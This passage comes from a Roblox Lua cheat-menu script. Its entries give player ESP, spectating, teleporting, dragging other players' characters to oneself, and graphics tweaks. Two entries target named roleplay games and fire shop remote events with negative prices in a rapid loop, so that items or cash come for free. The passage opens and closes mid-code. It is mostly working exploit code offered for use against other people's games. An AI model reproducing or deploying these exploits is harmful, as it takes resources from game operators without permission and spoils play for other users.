			local raPos, raVis = getPartPos(char:FindFirstChild("RightUpperArm") or char:FindFirstChild("Right Arm"))
			local llPos, llVis = getPartPos(char:FindFirstChild("LeftUpperLeg") or char:FindFirstChild("Left Leg"))
			local rlPos, rlVis = getPartPos(char:FindFirstChild("RightUpperLeg") or char:FindFirstChild("Right Leg"))

			if headVis and torsoVis then
				esp.HeadToTorso.From = headPos
				esp.HeadToTorso.To = torsoPos
				esp.HeadToTorso.Visible = true
			else
				esp.HeadToTorso.Visible = false
			end

			if torsoVis and laVis then
				esp.TorsoToLeftArm.From = torsoPos
				esp.TorsoToLeftArm.To = laPos
				esp.TorsoToLeftArm.Visible = true
			else
				esp.TorsoToLeftArm.Visible = false
			end

			if torsoVis and raVis then
				esp.TorsoToRightArm.From = torsoPos
				esp.TorsoToRightArm.To = raPos
				esp.TorsoToRightArm.Visible = true
			else
				esp.TorsoToRightArm.Visible = false
			end

			if torsoVis and llVis then
				esp.TorsoToLeftLeg.From = torsoPos
				esp.TorsoToLeftLeg.To = llPos
				esp.TorsoToLeftLeg.Visible = true
			else
				esp.TorsoToLeftLeg.Visible = false
			end

			if torsoVis and rlVis then
				esp.TorsoToRightLeg.From = torsoPos
				esp.TorsoToRightLeg.To = rlPos
				esp.TorsoToRightLeg.Visible = true
			else
				esp.TorsoToRightLeg.Visible = false
			end

			if headVis then
				esp.Name.Position = Vector2.new(headPos.X, headPos.Y - 20)
				esp.Name.Text = player.Name
				esp.Name.Visible = true
			else
				esp.Name.Visible = false
			end
		end
	end
end)

--// Player leave cleanup
Players.PlayerRemoving:Connect(function(player)
	clearESP(player)
end)

--// Toggle Button
toggleButton.MouseButton1Click:Connect(function()
	ESP_ENABLED = not ESP_ENABLED
	toggleButton.Text = ESP_ENABLED and "ESP: ON" or "ESP: OFF"
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("PLAYER SCANNER (MONSY)", function()
	--// PUBLIC ENEMY PLAYER SCANNER
-- Solid black GUI + Modern font + Hover effects + Click animations + Working VIEW/UNVIEW/TELEPORT

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local UIS = game:GetService("UserInputService")

-- Main ScreenGui
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ResetOnSpawn = false

-- Main Frame
local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 350, 0, 400)
MainFrame.Position = UDim2.new(0.5, -175, 0.5, -200)
MainFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
MainFrame.BorderSizePixel = 0
MainFrame.Visible = true
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.Parent = ScreenGui

-- UI Corner
local MainCorner = Instance.new("UICorner")
MainCorner.CornerRadius = UDim.new(0, 8)
MainCorner.Parent = MainFrame

-- Title
local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 40)
Title.BackgroundTransparency = 1
Title.Text = "PUBLIC ENEMY PLAYER SCANNER"
Title.TextColor3 = Color3.fromRGB(0,0,0)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 20
Title.Parent = MainFrame

-- Scan Button
local ScanButton = Instance.new("TextButton")
ScanButton.Size = UDim2.new(0.9, 0, 0, 35)
ScanButton.Position = UDim2.new(0.05, 0, 0, 50)
ScanButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
ScanButton.TextColor3 = Color3.fromRGB(0,0,0)
ScanButton.Font = Enum.Font.GothamBold
ScanButton.TextSize = 18
ScanButton.Text = "SCAN"
ScanButton.AutoButtonColor = false
ScanButton.Parent = MainFrame

local ScanCorner = Instance.new("UICorner")
ScanCorner.CornerRadius = UDim.new(0, 6)
ScanCorner.Parent = ScanButton

-- Hover effect
local function AddHoverEffect(button)
	button.MouseEnter:Connect(function()
		button.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	end)
	button.MouseLeave:Connect(function()
		button.BackgroundColor3 = Color3.fromRGB(255,255,255)
	end)
	button.MouseButton1Click:Connect(function()
		button.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
		task.wait(0.1)
		button.BackgroundColor3 = Color3.fromRGB(255,255,255)
	end)
end
AddHoverEffect(ScanButton)

-- Scrollable Player List
local PlayerListFrame = Instance.new("ScrollingFrame")
PlayerListFrame.Size = UDim2.new(0.9, 0, 0, 280)
PlayerListFrame.Position = UDim2.new(0.05, 0, 0, 90)
PlayerListFrame.BackgroundTransparency = 1
PlayerListFrame.BorderSizePixel = 0
PlayerListFrame.ScrollBarThickness = 6
PlayerListFrame.ScrollBarImageColor3 = Color3.fromRGB(0, 0, 0)
PlayerListFrame.Parent = MainFrame

local UIListLayout = Instance.new("UIListLayout")
UIListLayout.Parent = PlayerListFrame
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.Padding = UDim.new(0, 4)

-- Function to create each player entry
local function CreatePlayerButton(player)
	local PlayerButton = Instance.new("TextButton")
	PlayerButton.Size = UDim2.new(1, 0, 0, 30)
	PlayerButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	PlayerButton.TextColor3 = Color3.fromRGB(0,0,0)
	PlayerButton.Font = Enum.Font.Gotham
	PlayerButton.TextSize = 16
	PlayerButton.Text = player.DisplayName .. " (@" .. player.Name .. ")"
	PlayerButton.AutoButtonColor = false
	PlayerButton.Parent = PlayerListFrame

	local PlayerCorner = Instance.new("UICorner")
	PlayerCorner.CornerRadius = UDim.new(0, 6)
	PlayerCorner.Parent = PlayerButton

	AddHoverEffect(PlayerButton)

	-- Actions Frame
	local ActionsFrame = Instance.new("Frame")
	ActionsFrame.Size = UDim2.new(1, 0, 0, 30)
	ActionsFrame.BackgroundTransparency = 1
	ActionsFrame.Visible = false
	ActionsFrame.Parent = PlayerListFrame

	local function CreateActionButton(text)
		local Btn = Instance.new("TextButton")
		Btn.Size = UDim2.new(0.3, 0, 1, 0)
		Btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
		Btn.TextColor3 = Color3.fromRGB(0,0,0)
		Btn.Font = Enum.Font.GothamBold
		Btn.TextSize = 14
		Btn.Text = text
		Btn.AutoButtonColor = false
		Btn.Parent = ActionsFrame

		local BtnCorner = Instance.new("UICorner")
		BtnCorner.CornerRadius = UDim.new(0, 6)
		BtnCorner.Parent = Btn

		AddHoverEffect(Btn)
		return Btn
	end

	local ViewBtn = CreateActionButton("VIEW")
	local UnviewBtn = CreateActionButton("UNVIEW")
	local TeleportBtn = CreateActionButton("TELEPORT")

	ViewBtn.Position = UDim2.new(0, 0, 0, 0)
	UnviewBtn.Position = UDim2.new(0.35, 0, 0, 0)
	TeleportBtn.Position = UDim2.new(0.7, 0, 0, 0)

	-- === BUTTON FUNCTIONS ===
	ViewBtn.MouseButton1Click:Connect(function()
		if player.Character and player.Character:FindFirstChild("Head") then
			workspace.CurrentCamera.CameraSubject = player.Character:FindFirstChild("Head")
		end
	end)

	UnviewBtn.MouseButton1Click:Connect(function()
		if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
			workspace.CurrentCamera.CameraSubject = LocalPlayer.Character:FindFirstChild("Humanoid")
		end
	end)

	TeleportBtn.MouseButton1Click:Connect(function()
		if player.Character and player.Character:FindFirstChild("HumanoidRootPart") and
		   LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
			LocalPlayer.Character.HumanoidRootPart.CFrame =
				player.Character.HumanoidRootPart.CFrame + Vector3.new(2, 0, 0)
		end
	end)

	-- Show/hide action buttons
	PlayerButton.MouseButton1Click:Connect(function()
		ActionsFrame.Visible = not ActionsFrame.Visible
	end)
end

-- SCAN function
ScanButton.MouseButton1Click:Connect(function()
	for _, child in ipairs(PlayerListFrame:GetChildren()) do
		if child:IsA("TextButton") or child:IsA("Frame") then
			child:Destroy()
		end
	end

	task.spawn(function()
		for _, player in ipairs(Players:GetPlayers()) do
			if player ~= LocalPlayer then
				CreatePlayerButton(player)
				task.wait(0.15)
			end
		end
	end)
end)

-- Hide/Unhide with U
UIS.InputBegan:Connect(function(input, gp)
	if not gp and input.KeyCode == Enum.KeyCode.U then
		MainFrame.Visible = not MainFrame.Visible
	end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("PLAYER LIST TP (MONSY)", function()
	-- PUBLIC ENEMY - Player Viewer (LocalScript sa StarterGui)
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera

-- GUI parent
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "TaongGomaGui"
screenGui.ResetOnSpawn = false
screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

-- Toggle visibility keybind (K)
UserInputService.InputBegan:Connect(function(input, isProcessed)
	if not isProcessed and input.KeyCode == Enum.KeyCode.K then
		screenGui.Enabled = not screenGui.Enabled
	end
end)

-- Main draggable frame
local mainFrame = Instance.new("Frame", screenGui)
mainFrame.Size = UDim2.new(0, 520, 0, 360)
mainFrame.Position = UDim2.new(0.5, -260, 0.5, -180)
mainFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.BorderSizePixel = 0

-- Title bar
local titleBar = Instance.new("TextLabel", mainFrame)
titleBar.Size = UDim2.new(1, 0, 0, 36)
titleBar.BackgroundColor3 = Color3.fromRGB(255,255,255)
titleBar.Text = "PUBLIC ENEMY"
titleBar.Font = Enum.Font.GothamBold
titleBar.TextSize = 22
titleBar.TextColor3 = Color3.fromRGB(0,0,0)
titleBar.BorderSizePixel = 0

-- Left: player list (scrolling)
local leftWidth = 0.34
local scroll = Instance.new("ScrollingFrame", mainFrame)
scroll.Name = "PlayerList"
scroll.Position = UDim2.new(0, 0, 0, 36)
scroll.Size = UDim2.new(leftWidth, 0, 1, -36)
scroll.BackgroundColor3 = Color3.fromRGB(255,255,255)
scroll.ScrollBarThickness = 6
scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
scroll.BorderSizePixel = 0

local listLayout = Instance.new("UIListLayout", scroll)
listLayout.SortOrder = Enum.SortOrder.LayoutOrder
listLayout.Padding = UDim.new(0, 4)

-- Right: info + buttons
local right = Instance.new("Frame", mainFrame)
right.Position = UDim2.new(leftWidth, 0, 0, 36)
right.Size = UDim2.new(1 - leftWidth, 0, 1, -36)
right.BackgroundColor3 = Color3.fromRGB(255,255,255)
right.BorderSizePixel = 0

-- Center container for Name/Health
local infoContainer = Instance.new("Frame", right)
infoContainer.Size = UDim2.new(1, 0, 0.55, 0)
infoContainer.Position = UDim2.new(0, 0, 0, 8)
infoContainer.BackgroundTransparency = 1

local nameLabel = Instance.new("TextLabel", infoContainer)
nameLabel.Size = UDim2.new(1, -20, 0, 36)
nameLabel.Position = UDim2.new(0, 10, 0, 10)
nameLabel.BackgroundTransparency = 1
nameLabel.Font = Enum.Font.GothamBold
nameLabel.TextSize = 22
nameLabel.TextColor3 = Color3.fromRGB(0,0,0)
nameLabel.Text = "Name: None"
nameLabel.TextXAlignment = Enum.TextXAlignment.Center

local healthLabel = Instance.new("TextLabel", infoContainer)
healthLabel.Size = UDim2.new(1, -20, 0, 26)
healthLabel.Position = UDim2.new(0, 10, 0, 60)
healthLabel.BackgroundTransparency = 1
healthLabel.Font = Enum.Font.Gotham
healthLabel.TextSize = 18
healthLabel.TextColor3 = Color3.fromRGB(0,0,0)
healthLabel.Text = "Health: N/A"
healthLabel.TextXAlignment = Enum.TextXAlignment.Center

-- Buttons container
local buttonContainer = Instance.new("Frame", right)
buttonContainer.Size = UDim2.new(1, 0, 0.35, 0)
buttonContainer.Position = UDim2.new(0, 0, 0.6, 0)
buttonContainer.BackgroundTransparency = 1

local padding = Instance.new("UIPadding", buttonContainer)
padding.PaddingTop = UDim.new(0, 5)
padding.PaddingBottom = UDim.new(0, 5)

local btnLayout = Instance.new("UIListLayout", buttonContainer)
btnLayout.SortOrder = Enum.SortOrder.LayoutOrder
btnLayout.Padding = UDim.new(0, 8)
btnLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
btnLayout.VerticalAlignment = Enum.VerticalAlignment.Top

-- Button creator
local function createButton(label)
	local b = Instance.new("TextButton")
	b.Size = UDim2.new(0.85, 0, 0.22, 0)
	b.AnchorPoint = Vector2.new(0.5, 0)
	b.BackgroundColor3 = Color3.fromRGB(255,255,255)
	b.Font = Enum.Font.GothamBold
	b.TextSize = 18
	b.Text = label
	b.TextColor3 = Color3.fromRGB(0,0,0)
	b.AutoButtonColor = true
	local corner = Instance.new("UICorner")
	corner.CornerRadius = UDim.new(0, 8)
	corner.Parent = b
	b.Parent = buttonContainer
	return b
end

local viewButton = createButton("View Player")
local tpButton = createButton("Teleport to Player")
local bringButton = createButton("Bring Player") -- bagong button
local friendButton = createButton("Add Friend")

-- State
local selectedPlayer = nil
local isViewing = false
local isBringing = false
local originalCameraSubject = Camera.CameraSubject
local bringConnection

-- Helper: safely revert camera
local function revertCamera()
	if originalCameraSubject and typeof(originalCameraSubject) == "Instance" and originalCameraSubject.Parent then
		Camera.CameraSubject = originalCameraSubject
	else
		if LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
			Camera.CameraSubject = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
		end
	end
	Camera.CameraType = Enum.CameraType.Custom
	isViewing = false
	viewButton.Text = "View Player"
end

-- Build player list
local function refreshPlayerList()
	for _, c in ipairs(scroll:GetChildren()) do
		if c:IsA("TextButton") then c:Destroy() end
	end
	for _, plr in ipairs(Players:GetPlayers()) do
		if plr ~= LocalPlayer then
			local btn = Instance.new("TextButton")
			btn.Size = UDim2.new(1, -8, 0, 28)
			btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
			btn.TextColor3 = Color3.fromRGB(0,0,0)
			btn.Font = Enum.Font.Gotham
			btn.TextSize = 16
			btn.AutoButtonColor = true
			btn.Text = plr.Name
			local corner = Instance.new("UICorner")
			corner.CornerRadius = UDim.new(0, 4)
			corner.Parent = btn
			btn.Parent = scroll
			btn.MouseButton1Click:Connect(function()
				selectedPlayer = plr
				nameLabel.Text = "Name: " .. plr.Name
				local humanoid = plr.Character and plr.Character:FindFirstChildOfClass("Humanoid")
				if humanoid then
					healthLabel.Text = "Health: " .. math.floor(humanoid.Health)
				else
					healthLabel.Text = "Health: N/A"
				end
				if isViewing then revertCamera() end
			end)
		end
	end
end

-- Button behaviors
viewButton.MouseButton1Click:Connect(function()
	if not selectedPlayer then return end
	local char = selectedPlayer.Character
	local humanoid = char and char:FindFirstChildOfClass("Humanoid")
	if not humanoid then return end
	if not isViewing then
		originalCameraSubject = Camera.CameraSubject
		Camera.CameraSubject = humanoid
		Camera.CameraType = Enum.CameraType.Custom
		isViewing = true
		viewButton.Text = "Unview Player"
	else
		revertCamera()
	end
end)

tpButton.MouseButton1Click:Connect(function()
	if not selectedPlayer then return end
	local targetHRP = selectedPlayer.Character and selectedPlayer.Character:FindFirstChild("HumanoidRootPart")
	local myHRP = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
	if targetHRP and myHRP then
		myHRP.CFrame = targetHRP.CFrame + Vector3.new(2, 0.5, 0)
	end
end)

bringButton.MouseButton1Click:Connect(function()
	if not selectedPlayer then return end
	if not isBringing then
		isBringing = true
		bringButton.Text = "Unbring Player"
		bringConnection = RunService.RenderStepped:Connect(function()
			local targetChar = selectedPlayer.Character
			local myChar = LocalPlayer.Character
			if targetChar and myChar then
				local targetHRP = targetChar:FindFirstChild("HumanoidRootPart")
				local myHRP = myChar:FindFirstChild("HumanoidRootPart")
				if targetHRP and myHRP then
					targetHRP.CFrame = myHRP.CFrame + Vector3.new(2, 0, 0)
				end
			end
		end)
	else
		isBringing = false
		bringButton.Text = "Bring Player"
		if bringConnection then bringConnection:Disconnect() end
	end
end)

friendButton.MouseButton1Click:Connect(function()
	if selectedPlayer then
		LocalPlayer:RequestFriendship(selectedPlayer)
	end
end)

-- Keep health label updated
RunService.Heartbeat:Connect(function()
	if selectedPlayer then
		local humanoid = selectedPlayer.Character and selectedPlayer.Character:FindFirstChildOfClass("Humanoid")
		if humanoid then
			healthLabel.Text = "Health: " .. math.floor(humanoid.Health)
		else
			healthLabel.Text = "Health: N/A"
		end
	end
end)

Players.PlayerRemoving:Connect(function(plr)
	if plr == selectedPlayer then
		selectedPlayer = nil
		nameLabel.Text = "Name: None"
		healthLabel.Text = "Health: N/A"
		if isViewing then revertCamera() end
	end
	refreshPlayerList()
end)

Players.PlayerAdded:Connect(function()
	refreshPlayerList()
end)

refreshPlayerList()
end)

local function addMainMenuButton(text, callback)
	local panel = allTabPanels["MONSY MENU"]
	if not panel then return end
	local btn = new("TextButton", {
		Size = UDim2.new(1, -16, 0, 38),
		BackgroundColor3 = Color3.fromRGB(255,255,255),
		TextColor3 = Color3.new(0,0,0),
		Font = Enum.Font.GothamSemibold,
		TextSize = 14,
		Text = text,
		AutoButtonColor = false,
		Parent = panel,
	})
	new("UICorner", {CornerRadius = UDim.new(0,6), Parent = btn})
	btn.MouseEnter:Connect(function()
		TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(20,20,20)}):Play()
	end)
	btn.MouseLeave:Connect(function()
		TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(255,255,255)}):Play()
	end)
	btn.MouseButton1Click:Connect(function()
		clickSound:Play()
		callback()
	end)
end

--// 8 Buttons in Main Menu
addMainMenuButton("FPS BOOST CARTOON (MONSY)", function()
	--// FPS BOOST + CARTOON STYLE (ALL BLACK GUI VERSION)
-- Black Frame + Black Button + White Text + Rounded Corners

--// Services
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")

--// GUI
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local Button = Instance.new("TextButton")
local UICorner = Instance.new("UICorner")
local BtnCorner = Instance.new("UICorner")
local UIStroke = Instance.new("UIStroke")

ScreenGui.Name = "FPSBoostCartoon"
ScreenGui.Parent = game.CoreGui

-- Main Frame
Frame.Size = UDim2.new(0, 220, 0, 120)
Frame.Position = UDim2.new(0.4, 0, 0.3, 0)
Frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
Frame.BackgroundTransparency = 0.2
Frame.Active = true
Frame.Draggable = true
Frame.Parent = ScreenGui

UICorner.CornerRadius = UDim.new(0, 10)
UICorner.Parent = Frame

-- Title
Title.Size = UDim2.new(1, 0, 0, 40)
Title.BackgroundTransparency = 1
Title.Text = "FPS BOOST"
Title.TextColor3 = Color3.fromRGB(0,0,0)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 20
Title.Parent = Frame

-- Button
Button.Size = UDim2.new(1, -40, 0, 40)
Button.Position = UDim2.new(0, 20, 0, 60)
Button.BackgroundColor3 = Color3.fromRGB(255,255,255) -- black button
Button.TextColor3 = Color3.fromRGB(0,0,0) -- white text
Button.Font = Enum.Font.GothamBold
Button.TextSize = 18
Button.Text = "ENABLE CARTOON"
Button.Parent = Frame

BtnCorner.CornerRadius = UDim.new(0, 6)
BtnCorner.Parent = Button

UIStroke.Thickness = 2
UIStroke.Color = Color3.fromRGB(255, 255, 255)
UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
UIStroke.Parent = Button

--// State
local BoostEnabled = false

--// Functions
local function applyCartoon()
	-- Lighting tweaks
	Lighting.GlobalShadows = false
	Lighting.FogEnd = 100000
	Lighting.Brightness = 2
	Lighting.EnvironmentDiffuseScale = 0
	Lighting.EnvironmentSpecularScale = 0
	Lighting.Ambient = Color3.fromRGB(255, 255, 255)
	Lighting.OutdoorAmbient = Color3.fromRGB(255, 255, 255)

	-- Remove sky + effects
	for _, v in ipairs(Lighting:GetChildren()) do
		if v:IsA("Sky") then
			v:Destroy()
		elseif v:IsA("BlurEffect") or v:IsA("SunRaysEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("BloomEffect") then
			v.Enabled = false
		end
	end

	-- Cartoonify objects
	for _, obj in ipairs(workspace:GetDescendants()) do
		if obj:IsA("Part") or obj:IsA("MeshPart") then
			obj.Material = Enum.Material.SmoothPlastic
			obj.Reflectance = 0
		elseif obj:IsA("Decal") or obj:IsA("Texture") then
			obj:Destroy()
		end
	end

	-- Apply sa bagong spawn characters
	Players.PlayerAdded:Connect(function(player)
		player.CharacterAdded:Connect(function(char)
			task.wait(1)
			for _, obj in ipairs(char:GetDescendants()) do
				if obj:IsA("Part") or obj:IsA("MeshPart") then
					obj.Material = Enum.Material.SmoothPlastic
					obj.Reflectance = 0
				elseif obj:IsA("Decal") or obj:IsA("Texture") then
					obj:Destroy()
				end
			end
		end)
	end)
end

local function resetGraphics()
	-- Default lighting reset
	Lighting.GlobalShadows = true
	Lighting.Brightness = 3
	Lighting.FogEnd = 100000
	Lighting.Ambient = Color3.fromRGB(128, 128, 128)
	Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)

	-- Enable effects back
	for _, v in ipairs(Lighting:GetChildren()) do
		if v:IsA("BlurEffect") or v:IsA("SunRaysEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("BloomEffect") then
			v.Enabled = true
		end
	end
end

--// Toggle
Button.MouseButton1Click:Connect(function()
	BoostEnabled = not BoostEnabled
	if BoostEnabled then
		applyCartoon()
		Button.Text = "DISABLE CARTOON"
	else
		resetGraphics()
		Button.Text = "ENABLE CARTOON"
	end
end)
end)

addMainMenuButton("LASPINAS SYSTEM (MONSY)", function()
	--// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "GiveAllCashGUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Position = UDim2.new(0.5, -130, 0.5, -160)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Parent = gui
frame.Active = true
frame.Draggable = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "LAS PINAS ROLEPLAY"
title.TextColor3 = Color3.new(0,0,0)
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

-- List of items to buy
local items = {
    {"Silenced Pistol", "Silenced Pistol"},
    {"Heavy Vest", "Heavy Vest"},
    {"Glock-19", "Glock-19"},
    {"Oxy", "Oxy"},
    {"Vector", "Vector"},
    {"Tail", "Tail"},
    {"AmmoBox", "AmmoBox"}
}

local selectedItem = nil

-- Dropdown Button
local dropdown = Instance.new("TextButton")
dropdown.Size = UDim2.new(1, -20, 0, 30)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.Text = "Select Item"
dropdown.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdown.TextColor3 = Color3.new(0,0,0)
dropdown.Font = Enum.Font.Gotham
dropdown.TextSize = 14
dropdown.Parent = frame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

-- Dropdown Frame
local itemHeight = 28
local dropdownHeight = #items * itemHeight
local dropdownFrame = Instance.new("Frame")
dropdownFrame.Size = UDim2.new(1, -20, 0, dropdownHeight)
dropdownFrame.Position = UDim2.new(0, 10, 0, 85)
dropdownFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdownFrame.Visible = false
dropdownFrame.Parent = frame
Instance.new("UICorner", dropdownFrame).CornerRadius = UDim.new(0, 5)

-- Dropdown Buttons
for i, item in ipairs(items) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, itemHeight)
    btn.Position = UDim2.new(0, 0, 0, (i - 1) * itemHeight)
    btn.Text = item[1]
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 12
    btn.Parent = dropdownFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        selectedItem = item[2]
        dropdown.Text = item[1]
        dropdownFrame.Visible = false
    end)
end

-- Toggle Dropdown
dropdown.MouseButton1Click:Connect(function()
    dropdownFrame.Visible = not dropdownFrame.Visible
end)

-- Auto Buy Button
local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 35)
toggle.Position = UDim2.new(0, 10, 0, 100 + dropdownHeight)
toggle.Text = "Start Auto Buy"
toggle.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggle.TextColor3 = Color3.new(0,0,0)
toggle.Font = Enum.Font.GothamBold
toggle.TextSize = 14
toggle.Parent = frame
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)

-- Auto adjust frame height
local padding = 140 -- title + spacing + toggle
local frameHeight = padding + dropdownHeight
frame.Size = UDim2.new(0, 260, 0, frameHeight)

-- Auto Buy Logic
local isAutoBuying = false
toggle.MouseButton1Click:Connect(function()
    isAutoBuying = not isAutoBuying
    toggle.Text = isAutoBuying and "Stop Auto Buy" or "Start Auto Buy"
    
    while isAutoBuying do
        if selectedItem then
            ReplicatedStorage.ShopRemotes["BuyItem_67c0c0a9-879c-4502-812a-a346fcb4963a"]:FireServer(selectedItem, -100000)
            print("Auto-buying " .. selectedItem)
        end
        task.wait(0.001)
    end
end)

-- RightShift toggle GUI
UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)

addMainMenuButton("VENERAL CITY RP (MONSY)", function()
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

local gui = Instance.new("ScreenGui")
gui.Name = "GiveAllCashGUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 400)
frame.Position = UDim2.new(0.5, -150, 0.5, -200)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Parent = gui
frame.Active = true
frame.Draggable = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "PUBLIC ENEMY VENERAL ROLEPLAY"
title.TextColor3 = Color3.new(0,0,0)
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

local dropdown = Instance.new("TextButton")
dropdown.Size = UDim2.new(1, -20, 0, 30)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.Text = "Select Gun"
dropdown.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdown.TextColor3 = Color3.new(0,0,0)
dropdown.Font = Enum.Font.Gotham
dropdown.TextSize = 14
dropdown.Parent = frame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

local gunList = {"Silenced Pistol", "Glock-17", "Desert Eagle", "AmmoBox", "Oxy", "HK416", "UZI"}

local selectedGun = nil

local dropdownFrame = Instance.new("Frame")
dropdownFrame.Size = UDim2.new(1, -20, 0, #gunList * 25)
dropdownFrame.Position = UDim2.new(0, 10, 0, 85)
dropdownFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdownFrame.Visible = false
dropdownFrame.Parent = frame
Instance.new("UICorner", dropdownFrame).CornerRadius = UDim.new(0, 5)

for i, gun in ipairs(gunList) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 25)
    btn.Position = UDim2.new(0, 0, 0, (i - 1) * 25)
    btn.Text = gun
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 12
    btn.Parent = dropdownFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        selectedGun = gun
        dropdown.Text = gun
        dropdownFrame.Visible = false
    end)
end

dropdown.MouseButton1Click:Connect(function()
    dropdownFrame.Visible = not dropdownFrame.Visible
end)

local buttonSpacing = 5
local buttonWidth = (300 - 40 - (buttonSpacing * 2)) / 3
local buttonYOffset = 95 + #gunList * 25

local amountBox = Instance.new("TextBox") 

for i, data in ipairs({
    {Label = "Give 100K", Value = -100000},
    {Label = "Give 1M", Value = -1000000},
    {Label = "Give 10M", Value = -10000000},
}) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, buttonWidth, 0, 30)
    btn.Position = UDim2.new(0, 10 + (buttonWidth + buttonSpacing) * (i - 1), 0, buttonYOffset)
    btn.Text = data.Label
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 12
    btn.Parent = frame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        amountBox.Text = tostring(data.Value)
    end)
end

